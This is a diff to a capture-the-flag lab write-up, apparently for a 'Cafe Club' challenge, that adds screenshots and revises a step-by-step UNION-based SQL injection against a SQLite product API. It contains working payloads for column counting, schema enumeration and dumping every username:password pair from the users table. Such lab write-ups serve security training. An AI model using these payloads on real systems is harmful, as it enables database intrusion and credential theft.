@@ -51,7 +51,11 @@ Use the `ORDER BY` technique to determine the number of columns returned by the 
 /api/products/1 ORDER BY 9--
 ```
 
+![Ordery By 9](/images/bug-forge/daily/cafe-club/sqli/order-by-9-columns.png)
+
 When `ORDER BY 9` returns "product not found" but `ORDER BY 8` returns valid data, this confirms the query returns exactly 8 columns.
+
+![Ordery By 8](/images/bug-forge/daily/cafe-club/sqli/order-by-8-columns.png)
 
 ---
 
@@ -60,8 +64,10 @@ When `ORDER BY 9` returns "product not found" but `ORDER BY 8` returns valid dat
 Construct a UNION SELECT statement with 8 columns to inject custom data into the response. Test with NULL values first to avoid type mismatches:
 
 ```
-/api/products/1 AND 1=2 UNION SELECT null,null,null,null,null,null,null,null FROM sqlite_master--
+/api/products/1 UNION SELECT null,null,null,null,null,null,null,null FROM sqlite_master--
 ```
+
+![Null Payload](/images/bug-forge/daily/cafe-club/sqli/null-payload.png)
 
 Test which columns accept string values by replacing NULLs with string literals. Identifying a string-compatible column allows data extraction in the response.
 
@@ -72,8 +78,11 @@ Test which columns accept string values by replacing NULLs with string literals.
 Extract table names from the SQLite schema using `sqlite_master`. Use `group_concat()` to retrieve all table names in a single query:
 
 ```
-/api/products/1 AND 1=2 UNION SELECT null,null,null,null,null,null,null,group_concat(tbl_name) FROM sqlite_master WHERE type='table'--
+/api/products/1 UNION SELECT null,null,null,null,null,null,null,group_concat(tbl_name) FROM sqlite_master WHERE type='table'--
 ```
+
+![Tables](/images/bug-forge/daily/cafe-club/sqli/tables.png)
+
 
 The response reveals tables including: `users`, `products`, `sqlite_sequence`, and others. The `users` table is the target for credential extraction.
 
@@ -84,8 +93,9 @@ The response reveals tables including: `users`, `products`, `sqlite_sequence`, a
 Extract column names from the `users` table using SQLite's `pragma_table_info()` function:
 
 ```
-/api/products/1 AND 1=2 UNION SELECT null,null,null,null,null,null,null,group_concat(name) FROM pragma_table_info('users')--
+/api/products/1 UNION SELECT null,null,null,null,null,null,null,group_concat(name) FROM pragma_table_info('users')--
 ```
+![Columns](/images/bug-forge/daily/cafe-club/sqli/columns.png)
 
 The response reveals columns including: `id`, `username`, `password`, `email`, `created_at`, etc.
 
@@ -93,14 +103,15 @@ The response reveals columns including: `id`, `username`, `password`, `email`, `
 
 ### Step 7 - Credential Extraction and Flag Retrieval
 
-Extract the administrator credentials from the users table. Since the query returns one row at a time by default, the first row (typically the admin user) is retrieved:
+Extract all user credentials from the users table. Since the query returns one row at a time by default, `GROUP_CONCAT` is used to concatenate all usernames and passwords into a single result:
 
 ```
-/api/products/1 AND 1=2 UNION SELECT null,null,null,null,null,null,username,password FROM users--
+/api/products/1 UNION SELECT null,null,null,null,null,null,GROUP_CONCAT(username || ':' || password, ','),null FROM users--
 ```
 
-The response contains the admin username and password. The password field contains the challenge flag.
+The response contains all user credentials in `username:password` format. The administrator password field contains the challenge flag.
 
+![Flag](/images/bug-forge/daily/cafe-club/sqli/flag.png)
 ---
 
 ### Impact
